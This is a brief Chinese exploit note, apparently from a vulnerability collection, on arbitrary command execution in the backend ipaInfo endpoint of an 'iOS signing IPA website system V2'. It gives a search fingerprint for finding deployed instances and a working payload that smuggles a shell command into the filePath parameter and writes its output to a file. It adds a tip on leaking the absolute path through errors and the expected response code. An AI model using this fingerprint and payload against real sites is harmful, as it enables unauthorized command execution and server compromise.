# iOS签名IPA网站系统V2存在后台ipaInfo任意命令执行漏洞

iOS ｜ 命令执行 ｜ —
- **指纹**：`body="/assets/index/css/mobileSelect.css"`

**Payload**
```
Payload(命令写到文件的话需要绝对路径，可通过使其报错等方式拿到):
/zxqm.php/category/ipaInfo?filePath=id%20>%20绝对路径/1.txt
```
- **响应特征**：200